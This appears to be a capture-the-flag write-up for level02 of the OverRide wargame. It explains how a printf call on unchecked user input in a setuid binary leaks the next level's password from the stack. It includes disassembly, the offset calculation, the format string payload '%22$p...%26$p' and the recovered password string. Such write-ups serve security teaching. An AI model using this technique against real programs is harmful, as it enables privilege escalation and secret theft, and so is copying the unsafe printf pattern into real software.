# LEVEL02

## 1. Inspect The Executable

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level02/level02
level02@OverRide:~$ ls -l
total 12
-rwsr-s---+ 1 level03 users 9452 Sep 10  2016 level02
```
We can see that the binary has the `s` bit set on the **execution permission**, which means the program will run with **`level03` privileges**.

```bash
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: username
--[ Password: password
*****************************************
username does not have access!
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
--[ Password: *****************************************
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa does not have access!
```

The program asks for a username and a password. There is no sign of overflow possible at first sight.

## 2. Analyze The Executable

```bash

(gdb) info functions
All defined functions:

Non-debugging symbols:
[...]
0x0000000000400814  main
[...]
```

### Program Behavior

#### main function

The main function open the file `"/home/users/level03/.pass"` in read mode. Stores it in the `local_a8` variable.

Then ask for a username, that is not verified, and ask for a password. If the password is equal to the content of the file, it call `system("/bin/sh")`. Otherwise, it's print the `username` and the message `" does not have access!"`.

## 3. Identify The Vulnerability

The vulnerabiltiy comes from the end of the program in the message print in the case of wrong password:
```c
  printf(local_78);
  puts(" does not have access!");
```

The `printf` without a safe format string call allows to proceed to a Format String Attack.

### Format String Attack Explaination

When user-controlled input is passed **directly** as the **format string** `printf(string)`, instead of using a **safe call** such as `printf("%s", string)`, the program allows us to **inject format specifiers**.

For example, `%x` reads and prints values from the stack as hexadecimal, consuming one stack argument per specifier.
This behavior allows us to read and write arbitrary values in memory.

---

### Get Exploit Values

```bash
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: aaaa %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
--[ Password: b
*****************************************
aaaa ffffe500 0 62 2a2a2a2a 2a2a2a2a ffffe6f8 f7ff9a08 62 0 0 0 0 0 0 0 0 0 0 0 0 0 34376848 61733951 574e6758 6e475873 664b394d feff00 61616161 does not have access!
```

`aaaa` corresponding to `61616161` in hexadecimal appears at the **28th position** on the stack.

---

```c
  local_10 = fopen("/home/users/level03/.pass","r");
  if (local_10 == (FILE *)0x0) {
    fwrite("ERROR: failed to open password file\n",1,0x24,stderr);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  sVar2 = fread(local_a8,1,0x29,local_10);
  [...]
    iVar1 = strncmp(local_a8,local_118,0x29);
```

The file `/home/users/level03/.pass` content is store in `local_a8`.

```s
   0x00000000004008e6 <+210>:	lea    -0xa0(%rbp),%rax
   0x00000000004008ed <+217>:	mov    -0x8(%rbp),%rdx
   0x00000000004008f1 <+221>:	mov    %rdx,%rcx
   0x00000000004008f4 <+224>:	mov    $0x29,%edx
   0x00000000004008f9 <+229>:	mov    $0x1,%esi
   0x00000000004008fe <+234>:	mov    %rax,%rdi
   0x0000000000400901 <+237>:	callq  0x400690 <fread@plt>
```

The `fread()` first argument is stored in `%rdi`, that contain `-0xa0(%rbp)`. So the pass is store at `%rbp - 0xa0`.

---

```c
  printf(local_78);
```

The user input is stored in `local_78`.

```s
   0x0000000000400a96 <+642>:	lea    -0x70(%rbp),%rax
   0x0000000000400a9a <+646>:	mov    %rax,%rdi
   0x0000000000400a9d <+649>:	mov    $0x0,%eax
   0x0000000000400aa2 <+654>:	callq  0x4006c0 <printf@plt>
```

The user input is store at `%rbp - 0x70`.

With the 2 `%rbp` offsets `%rbp - 0xa0` and `%rbp - 0x70`, we can calculate the offset between our input and the pass :

```
offset = 0xa0 - 0x70
offset = 160 - 112
offset = 48 bytes
```

We know that each 8 bytes is equal to 1 element in the stack, and the pass is 40 bytes length. So we can deduce this stack layout :

```
						  __
[local_a8] 	- 22th element	|
 			- 23th element	|
 			- 24th element	|	password
 			- 25th element	|
 			- 26th element__|	
 			- 27th element
[local_78]	- 28th element
```

We need to print the 5 elements from 22th to 27th.
For that we need to use the format specifier `X$p` to print the value at the position `X` in the stack.

### Create Payload

```
%22$p%23$p%24$p%25$p%26$p
```

## 4. Capture The Flag

```bash
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %22$p%23$p%24$p%25$p%26$p
--[ Password: password
*****************************************
0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d does not have access!
```

### Convert the Hexadecimal

```
0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d
```

We need to convert the hexadecimal ouput into a string.

With a python script `decript.py` in `Ressources/`, we get this ouput :
```bash
)> python3 decrypt.py 0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
